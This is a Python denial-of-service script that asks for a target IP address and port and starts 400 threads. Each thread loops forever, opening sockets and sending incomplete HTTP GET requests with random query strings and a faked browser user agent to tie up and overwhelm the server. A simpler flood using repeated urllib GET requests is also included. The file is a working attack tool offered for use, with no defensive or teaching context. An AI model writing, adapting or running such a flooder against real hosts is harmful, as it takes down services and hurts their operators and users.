import threading
import urllib.request
import urllib.parse
from socket import *
import ssl
import random
import time

class dos (threading.Thread):
    def __init__(self,ip,port):
        threading.Thread.__init__(self)
        self.ip=ip
        self.port=port
    def run(self):
        while 1:
            self.makeRequest2(ip,port)
    def makeRequest(self,ip,port): #Uses simple get request to create the attack
        try:
            connection=urllib.request.urlopen("http://"+ip+":"+str(port))
            print(connection.geturl())
        except:
            print("The server is unavailable or down")
        
    def makeRequest2(self,ip,port): #Uses sockets and in complete request to execute attack
        connection=socket(AF_INET,SOCK_STREAM)
        try:
            connection.connect((ip,port))
            connection.send('GET /?{0} HTTP/1.1\r\n'.format(random.randint(0,2000)).encode('UTF-8'))
            connection.send(b'User-agent: Mozilla/5.0(Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0\r\n\r\n')
            connection.send(b'Connection:Keep-Alive\r\n\r\n')
            
        except:
            print("The server is down or unavailable")
        
        
v=400
ip=input("Enter the ip to attck: ")
port=int(input("Enter the port to attack: "))
while v>0:
    dos(ip,port).start()
    v-=1


